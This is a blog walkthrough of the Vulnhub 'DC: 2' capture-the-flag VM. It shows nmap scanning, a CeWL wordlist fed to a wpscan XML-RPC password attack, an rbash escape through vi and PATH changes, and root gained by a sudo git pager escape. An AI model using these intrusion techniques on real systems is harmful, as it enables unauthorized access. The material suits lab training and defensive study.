---
layout: post
title: Vulnhub - DC&#58; 2
---

Here's a walkthrough for the second VM in the DC Vulnhub series. I keep the VMs I download from the internet on an internal network so as not to expose my home network. I clone my attacker VM and then add that to the internal network to begin pentesting. If you are as cautious as me and do the same, save yourself some time by updating wpscan before cloning if you haven't already, i.e. run `wpscan --update`.

## Enumeration

My internal network's LAN segment range is 10.10.10.0/24. So, let's first find where this box is with `nmap 10.10.10.0/24`. Besides my IP (which you can find with `ifconfig eth0`) and the IP of my DHCP server, there is only one other host: 10.10.10.7. That basic enumeration tells us port 80 is open, but let's do a more in-depth dive with my [portscan](github.com/zacheller/ctf_tools/blob/master/portscan.sh) script.

```bash
$ portscan 10.10.10.7
Open ports: 80,7744
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 20:51 EDT
Nmap scan report for dc-2 (10.10.10.7)
Host is up (0.00042s latency).
Other addresses for dc-2 (not scanned): 10.10.10.7

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.7.10
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: DC-2 &#8211; Just another WordPress site
|_https-redirect: ERROR: Script execution failed (use -d to debug)
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
MAC Address: 08:00:27:D2:E9:60 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.70 seconds
```
Let's check the front door first. Poking around the site, it becomes apparent that the Wordpress site is redirecting to URLs like so: `dc-2/<page>`, which means all the links are broken. Luckily this is an easy fix: 

```
$ echo "10.10.10.7 dc-2" >> /etc/hosts
```

Great, now these links are resolving. And we can grab Flag 1 linked on the front page:
```
Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.
More passwords is always better, but sometimes you just can’t win them all.
Log in as one to see the next flag.
If you can’t find it, log in as another.
```

Seems like we are expected to use CeWL, a Custom Word List generator (which coincidentally comes with Kali and is pronounced "cool"). CeWL is neat because it spiders a given URL, up to a specified depth, and returns a list of words which can then be used for password crackers like john or hashcat. It's important to use the `-w` flag so we don't add the banner to the list. The following command grabs all the words of 3 characters or greater and saves them to a file.

```bash
$ cewl dc-2 -w password_list.txt
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

We could also do some spidering of our own with dirbuster or gobuster, but since this is a WordPress site and WPScan was built specifically to scan those sites, we should probably take advantage (it also coincidentally comes with Kali). The plain `wpscan --url dc-2` comes up with some interesting info, but we're here to get access!

```
$ wpscan --url dc-2 -P password_list.txt -e ap
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.9
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://dc-2/ [10.10.10.7]
[+] Started: Tue Aug 18 21:07:34 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://dc-2/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://dc-2/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <============> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jerry
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - jerry / adipiscing                                                            
[SUCCESS] - tom / parturient                                                              
Trying admin / the Time: 00:00:34 <===================> (645 / 645) 100.00% Time: 00:00:34
Trying admin / log Time: 00:00:34 <===================> (645 / 645) 100.00% Time: 00:00:34

[i] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Tue Aug 18 21:08:12 2020
[+] Requests Done: 675
[+] Cached Requests: 34
[+] Data Sent: 313.325 KB
[+] Data Received: 624.95 KB
[+] Memory used: 208.531 MB
[+] Elapsed time: 00:00:38
```

This wonderful tool just got us two user accounts, `tom:parturient` and `jerry:adipiscing`. The default login page for WordPress is `/wp-login.php`, but if you didn't know that you could run dirbuster or google it. Logged in as tom, I find Flag 2 under Pages->All Pages.

```
If you can't exploit WordPress and take a shortcut, there is another way.
Hope you found another entry point.
```

## Gaining Access

Hmm well this is interesting. I'm sure there's a shell plugin for WordPress we could install. But we still have an SSH service running on port 7744 to check out, so let's see if these users are smart enough to use different usernames and passwords.

```bash
$ ssh dc-2 -p 7744 -l jerry
...
jerry@dc-2's password: 
Permission denied, please try again.
...
$ ssh dc-2 -p 7744 -l tom
tom@dc-2's password: 
...
tom@DC-2:~$
```
We can get in as tom but not jerry. tom has a restricted shell, but with `ls` we can see `flag3.txt` in tom's home directory. I tried a few commands that didn't work and then ran `compgen -c`.  compgen is a bash built-in command which is used to list all the commands that could be executed in the Linux system. The output told me tom can open `vi`. I tried the standard `vi` escape (`:set shell=/bin/bash` etc) but found myself in a bash shell that still couldn't use certain commands, though some were not restricted in the way they were in the previous rbash shell. If commands are not restricted but instead not found, there may be something wrong with our `$PATH`.
```
$ echo $PATH
/home/tom/usr/bin
```

Let's add `/bin` and `/usr/bin` to the path so we can use more commands, `cat` our flag file, and then switch user to jerry per the flag's hint.
```
$ export PATH=$PATH:/bin:/usr/bin
$ cat flag3.txt	
Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
$ su jerry
Password: #adipiscing
jerry@DC-2:/home/tom$ cd ~
jerry@DC-2:~$ ls
flag4.txt
jerry@DC-2:~$ cat flag4.txt 
Good to see that you've made it this far - but you're not home yet. 

You still need to get the final flag (the only flag that really counts!!!).  

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!
```

Flag 4 is found, and we are given a hint to use `git`. And, per our output to `sudo -l`, it was a good hint.

```
jerry@DC-2:~$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
```

## Privilege Escalation

Since we are able to run `/usr/bin/git` as root, we can do a privilege escalation. Whenever you find a command you can run as root, check [gtfobins.github.io](gtfobins.github.io) if you don't know how to take advantage.

`sudo git -p help config` displays the `git` man page using `less` which we can escape from using `!/bin/sh`.

```
!/bin/sh
# whoami
root
# cd ~
# ls
final-flag.txt
# cat final-flag.txt
 __    __     _ _       _                    _ 
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   


Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```

I hope you learned something and enjoyed my walkthrough.
